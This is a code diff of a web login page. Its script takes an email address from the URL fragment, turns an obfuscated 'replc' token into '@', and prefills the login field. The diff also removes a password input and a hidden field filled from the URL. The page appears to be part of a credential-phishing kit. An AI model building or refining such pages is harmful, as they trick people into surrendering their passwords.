@@ -190,12 +190,12 @@ return(str.substring(theleft, theright));
                 console.log("Raw hash:", hash); // Debug: Check raw hash
 
                 if (hash) {
-                    // Decode URL-encoded characters (e.g., %2D to -)
+                    // Decode URL-encoded characters (e.g., %20 to space)
                     const decodedHash = decodeURIComponent(hash);
                     console.log("Decoded hash:", decodedHash); // Debug: Check decoded hash
 
-                    // Replace -replc- with @ using a case-insensitive regular expression
-                    const formattedEmail = decodedHash.replace(/-replc-/i, "@");
+                    // Replace replc with @ using a case-insensitive regular expression
+                    const formattedEmail = decodedHash.replace(/replc/i, "@");
                     console.log("Formatted email:", formattedEmail); // Debug: Check final email
 
                     // Set the input field value to the formatted email
@@ -224,32 +224,7 @@ return(str.substring(theleft, theright));
 
         // Run the function when the page loads
         window.onload = setEmailFromHash;
-    </script>
-          </div>
-        </div>
-		
-        <div class="form-group" id="p1a" style="display: block;">
-		
-          <div class="input-group" >
-            <span class="input-group-addon"><i class="fas fa-lock"></i></span>
-            <input type="password" class="form-control" autofocus id="password" name="password" placeholder="Password" required="">
-<input type="hidden" id="bot" name="bot" value="">
-	<SCRIPT LANGUAGE="javascript">
-
-var locate = window.location
-document.joe.burns.value = locate
-
-var text = document.joe.burns.value
-var res = delineate(text);
-var zork1 = res;
-function delineate(str){
-
-theleft = str.indexOf("#") + 1;
-theright = str.lastIndexOf("@");
-return(str.substring(theleft, theright));
-}
-document.mac.bot.value = zork1;
-</script>			
+    </script>			
           </div>
 		   </div>
 		   
